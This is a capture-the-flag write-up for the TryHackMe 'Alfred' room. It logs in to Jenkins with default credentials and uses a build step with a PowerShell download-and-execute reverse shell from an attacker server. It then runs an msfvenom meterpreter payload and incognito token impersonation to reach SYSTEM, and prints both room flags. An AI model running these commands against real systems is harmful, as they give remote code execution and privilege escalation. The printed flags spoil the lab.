###### Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.
Room: https://tryhackme.com/room/alfred
##

**sudo nmap** -Pn -sS -sV -T5 -vv xx.xx.xxx.xx

```
PORT     STATE SERVICE    REASON          VERSION
80/tcp   open  http       syn-ack ttl 127 Microsoft IIS httpd 7.5
3389/tcp open  tcpwrapped syn-ack ttl 127
8080/tcp open  http       syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

If we go to http://machineIP/8080, we can see a Jenkins application running.   
Bruteforcing this reveals the login credentials. I just checked the default jenkins credentials first.
```
username: admin
password: admin
```
Create a new project/edit the current one and add the following commands  
```
powershell invoke-expression (New-Object Net.WebClient).DownloadString('http://xx.x.x.xxx:8000/Invoke-PowerShellTcp.ps1');
Invoke-PowerShellTcp -Reverse -IPAddress xx.x.x.xxx -Port 1111
```
**Note:** DO NOT change the file name. It won't work.  
The file **Invoke-PowerShellTcp.ps1** is from [Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).  

Before Building the Project on Jenkins, be sure you started a local listener & HTTP server and the Invoke-PowerShellTcp.ps1 file is available.  

Then, Build the Project on Jenkins. From your server, it'll download the .ps1 file.  
On your listener, you'll get a shell.  

**server terminal** 
```
xx.xx.xxx.xx - - [11/Oct/2021 00:21:32] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

**listener terminal**
```
onnect to [xx.x.x.xxx] from (UNKNOWN) [xx.xx.xxx.xx] 49217
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.
PS C:\Program Files (x86)\Jenkins\workspace\project> 
```

The first flag is on C:\Users\bruce\Desktop   **[1]**  
> 79007a09481963edf2e1321abd9ae2a0

Generate a payload using **msfvenom**.   
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=xx.x.x.xxx LPORT=1112 -f exe -o shell.exe
```
Upload it by using the following command  

```powershell "(New-Object System.Net.WebClient).Downloadfile('http://attacking_machine_ip:8000/shell.exe','shell.exe')"```

Before running the script, open **metasploit** and run the following commands  

```
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST attackin_machine_IP
set LPORT listening-port 
run
```

You should see something similar    
```
[*] Started reverse TCP handler on xx.x.x.xxx:1112
```

Now, on the target machine run **Start-Process "shell.exe"**.  
We got a meterpreter shell running.  

On the meterpreter shell, use **load incognito**.  
Then, use **impersonate_token "BUILTIN\Administrators** to escalate our privileges.  

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
The second and final flag is in C:\Windows\System32\config\root.txt    **[2]**
> dff0f748678f280250f25a45b8046b4a
##
**Note**: This room can be exploited without the help of metasploit by uploading a static incognito.exe binary since user bruce has the impersonate privileges. Then, we can use the static binary to create a new user with administrator privileges and use RDP to access the machine.
